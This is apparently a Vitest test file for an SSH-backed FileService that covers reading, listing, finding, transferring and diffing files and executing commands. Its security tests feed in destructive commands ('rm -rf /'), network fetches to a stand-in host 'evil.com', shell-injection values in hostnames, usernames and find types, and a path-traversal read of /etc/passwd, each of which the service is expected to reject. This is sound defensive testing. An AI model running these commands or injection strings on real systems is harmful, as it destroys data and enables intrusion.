import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { FileService } from "./file-service.js";
import type { ISSHService } from "./interfaces.js";
import type { HostConfig } from "../types.js";

describe("FileService", () => {
  let fileService: FileService;
  let mockSSHService: ISSHService;
  let testHost: HostConfig;

  beforeEach(() => {
    mockSSHService = {
      executeSSHCommand: vi.fn(),
      getHostResources: vi.fn()
    };
    fileService = new FileService(mockSSHService);
    testHost = {
      name: "testhost",
      host: "192.168.1.100",
      protocol: "ssh",
      sshUser: "testuser"
    };
  });

  afterEach(() => {
    // Clean up env vars after each test
    delete process.env.SYNAPSE_ALLOW_ANY_COMMAND;
  });

  describe("readFile", () => {
    it("reads file content via cat command", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("file content here");

      const result = await fileService.readFile(testHost, "/etc/hosts", 1048576);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("cat"),
        [],
        expect.any(Object)
      );
      expect(result.content).toBe("file content here");
      expect(result.truncated).toBe(false);
    });

    it("truncates content exceeding maxSize", async () => {
      const longContent = "x".repeat(2000);
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(longContent);

      const result = await fileService.readFile(testHost, "/tmp/big.txt", 1000);

      expect(result.content.length).toBeLessThanOrEqual(1000);
      expect(result.truncated).toBe(true);
    });

    it("rejects invalid maxSize values", async () => {
      await expect(fileService.readFile(testHost, "/etc/hosts", Number.NaN)).rejects.toThrow(
        /maxSize must be an integer between 1 and/
      );
      expect(mockSSHService.executeSSHCommand).not.toHaveBeenCalled();
    });
  });

  describe("listDirectory", () => {
    it("returns ls output", async () => {
      const lsOutput = "total 4\ndrwxr-xr-x 2 root root 4096 Jan 1 00:00 .\n";
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(lsOutput);

      const result = await fileService.listDirectory(testHost, "/var/log", false);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("ls"),
        [],
        expect.any(Object)
      );
      expect(result).toBe(lsOutput);
    });

    it("shows hidden files when showHidden is true", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("hidden files");

      await fileService.listDirectory(testHost, "/var/log", true);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-la"),
        [],
        expect.any(Object)
      );
    });
  });

  describe("treeDirectory", () => {
    it("returns tree output with depth limit", async () => {
      const treeOutput = ".\n├── dir1\n└── file.txt\n";
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(treeOutput);

      const result = await fileService.treeDirectory(testHost, "/home", 3);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-L 3"),
        [],
        expect.any(Object)
      );
      expect(result).toBe(treeOutput);
    });
  });

  describe("executeCommand", () => {
    it("executes command in working directory", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("output");

      const result = await fileService.executeCommand(testHost, "/tmp", "ls -la", 30000);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("cd"),
        [],
        { timeoutMs: 30000 }
      );
      expect(result.stdout).toBe("output");
    });

    describe("command allowlist", () => {
      it("allows: cat, head, tail, grep, ls, tree, find", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("ok");

        for (const cmd of ["cat file", "head -n 10 file", "ls -la", "grep pattern file"]) {
          await expect(
            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
          ).resolves.not.toThrow();
        }
      });

      it("blocks: rm, mv, cp, chmod, chown", async () => {
        for (const cmd of ["rm -rf /", "mv file dest", "chmod 777 file"]) {
          await expect(fileService.executeCommand(testHost, "/tmp", cmd, 30000)).rejects.toThrow(
            /not in allowed list/
          );
        }
      });

      it("blocks: wget, curl (network commands)", async () => {
        for (const cmd of ["wget http://evil.com", "curl http://evil.com"]) {
          await expect(fileService.executeCommand(testHost, "/tmp", cmd, 30000)).rejects.toThrow(
            /not in allowed list/
          );
        }
      });

      it("allows any command when SYNAPSE_ALLOW_ANY_COMMAND=true", async () => {
        process.env.SYNAPSE_ALLOW_ANY_COMMAND = "true";
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("ok");

        await expect(
          fileService.executeCommand(testHost, "/tmp", "rm -rf /tmp/test", 30000)
        ).resolves.not.toThrow();
      });
    });
  });

  describe("findFiles", () => {
    it("searches with pattern", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(
        "/var/log/syslog\n/var/log/auth.log"
      );

      const result = await fileService.findFiles(testHost, "/var", "*.log", {});

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-name"),
        [],
        expect.any(Object)
      );
      expect(result).toContain("/var/log/syslog");
    });

    it("respects maxDepth option", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("");

      await fileService.findFiles(testHost, "/var", "*", { maxDepth: 2 });

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-maxdepth 2"),
        [],
        expect.any(Object)
      );
    });

    it("respects type option", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("");

      await fileService.findFiles(testHost, "/var", "*", { type: "f" });

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-type f"),
        [],
        expect.any(Object)
      );
    });

    it("respects limit option", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("");

      await fileService.findFiles(testHost, "/var", "*", { limit: 50 });

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("head -n 50"),
        [],
        expect.any(Object)
      );
    });

    it("rejects invalid type values at runtime", async () => {
      // TypeScript types are compile-time only; runtime validation is required
      // to prevent shell injection via malicious type values like "f; rm -rf /"
      const maliciousType = "f; rm -rf /" as "f" | "d" | "l";

      await expect(
        fileService.findFiles(testHost, "/var", "*", { type: maliciousType })
      ).rejects.toThrow(/Invalid type/);

      // Ensure SSH command was never called with the malicious input
      expect(mockSSHService.executeSSHCommand).not.toHaveBeenCalled();
    });

    it("accepts valid type values (f, d, l)", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("");

      for (const validType of ["f", "d", "l"] as const) {
        await expect(
          fileService.findFiles(testHost, "/var", "*", { type: validType })
        ).resolves.not.toThrow();
      }
    });
  });

  describe("transferFile", () => {
    it("transfers file between hosts", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

      const sourceHost = { ...testHost, name: "source" };
      const targetHost = { ...testHost, name: "target", host: "192.168.1.101" };

      const result = await fileService.transferFile(
        sourceHost,
        "/tmp/file.txt",
        targetHost,
        "/backup/"
      );

      expect(result.bytesTransferred).toBeGreaterThanOrEqual(0);
    });

    it("warns on system path targets", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

      const result = await fileService.transferFile(
        testHost,
        "/tmp/file.txt",
        testHost,
        "/etc/hosts"
      );

      expect(result.warning).toContain("system path");
    });
  });

  describe("diffFiles", () => {
    it("returns diff output for same host", async () => {
      const diffOutput = "--- a/hosts\n+++ b/hosts\n@@ -1,2 +1,3 @@\n localhost\n+newhost";
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(diffOutput);

      const result = await fileService.diffFiles(testHost, "/etc/hosts", testHost, "/tmp/hosts", 3);

      expect(result).toContain("---");
      expect(result).toContain("+++");
    });

    it("compares files across hosts", async () => {
      const host2 = { ...testHost, name: "host2", host: "192.168.1.102" };
      vi.mocked(mockSSHService.executeSSHCommand)
        .mockResolvedValueOnce("content A")
        .mockResolvedValueOnce("content B");

      const result = await fileService.diffFiles(testHost, "/tmp/fileA", host2, "/tmp/fileB", 3);

      expect(result).toContain("---");
      expect(result).toContain("+++");
    });

    it("reports identical files", async () => {
      const host2 = { ...testHost, name: "host2", host: "192.168.1.102" };
      vi.mocked(mockSSHService.executeSSHCommand)
        .mockResolvedValueOnce("same content")
        .mockResolvedValueOnce("same content");

      const result = await fileService.diffFiles(testHost, "/tmp/fileA", host2, "/tmp/fileB", 3);

      expect(result).toContain("identical");
    });
  });

  describe("security", () => {
    it("validates paths before execution", async () => {
      await expect(fileService.readFile(testHost, "/../etc/passwd", 1000)).rejects.toThrow(
        /traversal|invalid/i
      );

      await expect(fileService.listDirectory(testHost, "/var/../etc", false)).rejects.toThrow(
        /traversal|invalid/i
      );
    });

    it("rejects relative paths", async () => {
      await expect(fileService.readFile(testHost, "relative/path", 1000)).rejects.toThrow(
        /absolute|invalid/i
      );
    });

    it("escapes shell arguments", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("ok");

      await fileService.readFile(testHost, "/tmp/file-with-space.txt", 1000);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("'"), // Single quotes indicate escaping
        [],
        expect.any(Object)
      );
    });

    describe("transferFile host validation", () => {
      it("rejects targetHost with invalid hostname containing shell metacharacters", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

        const sourceHost = { ...testHost, name: "source" };
        const maliciousHost = {
          ...testHost,
          name: "target",
          host: "192.168.1.1; rm -rf /" // Command injection attempt
        };

        await expect(
          fileService.transferFile(sourceHost, "/tmp/file.txt", maliciousHost, "/backup/")
        ).rejects.toThrow(/invalid host format/i);
      });

      it("rejects targetHost with invalid sshUser containing shell metacharacters", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

        const sourceHost = { ...testHost, name: "source" };
        const maliciousHost = {
          ...testHost,
          name: "target",
          host: "192.168.1.101",
          sshUser: "user; rm -rf /" // Command injection attempt
        };

        await expect(
          fileService.transferFile(sourceHost, "/tmp/file.txt", maliciousHost, "/backup/")
        ).rejects.toThrow(/invalid ssh user/i);
      });

      it("allows valid hostnames for cross-host transfers", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

        const sourceHost = { ...testHost, name: "source" };
        const validHost = {
          ...testHost,
          name: "target",
          host: "server-01.example.com",
          sshUser: "deploy_user"
        };

        await expect(
          fileService.transferFile(sourceHost, "/tmp/file.txt", validHost, "/backup/")
        ).resolves.not.toThrow();
      });

      it("allows IPv6 hostnames for cross-host transfers", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

        const sourceHost = { ...testHost, name: "source" };
        const ipv6Host = {
          ...testHost,
          name: "target",
          host: "[::1]",
          sshUser: "admin"
        };

        await expect(
          fileService.transferFile(sourceHost, "/tmp/file.txt", ipv6Host, "/backup/")
        ).resolves.not.toThrow();
      });
    });
  });
});
